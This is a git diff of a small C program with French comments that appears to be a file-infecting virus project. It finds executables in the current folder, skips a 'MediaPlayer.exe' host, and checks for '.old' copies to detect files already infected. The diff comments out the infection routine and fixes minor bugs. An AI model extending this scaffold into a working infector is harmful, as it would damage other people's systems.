@@ -20,13 +20,13 @@ int main(int argc, char const *argv[])
 }
 
 char** getFiles(){
-    char** files = malloc(3*sizeof(char*));
+    char** files = malloc(5*sizeof(char*));
     int cpt = 0;
     DIR *repertoire = opendir(".");
     struct stat statsF;
     struct dirent *lecture;
     printf("Liste des fichiers exécutables : \n");
-    while(lecture = readdir(repertoire)){
+    while((lecture = readdir(repertoire))){
         /**
          * Lecture du répertoire
          */
@@ -34,7 +34,7 @@ char** getFiles(){
             /**
              * Si le fichier est exécutable et régulier
              */
-            if ((strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
+            if (cpt<5 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
                 /**
                  * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
                  */
@@ -50,6 +50,7 @@ char** getFiles(){
     return files;
 }
 
+/*
 void infecte(char** f){
     for(int i = 0; i < sizeof(f); i++)
     {
@@ -59,6 +60,7 @@ void infecte(char** f){
     }
 
 }
+*/
 
 bool dejaInfecte(char* f){
     char* extension = ".old";
@@ -70,8 +72,8 @@ bool dejaInfecte(char* f){
     } else{
         DIR* repertoire = opendir(".");
         struct dirent *lecture;
-        while(lecture = readdir(repertoire)){
-            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), 'r') != NULL)) {
+        while((lecture = readdir(repertoire))){
+            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), "r") != NULL)) {
                 /**
                 * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
                 * Le fichier lu avec l'extension .old a été ouvert
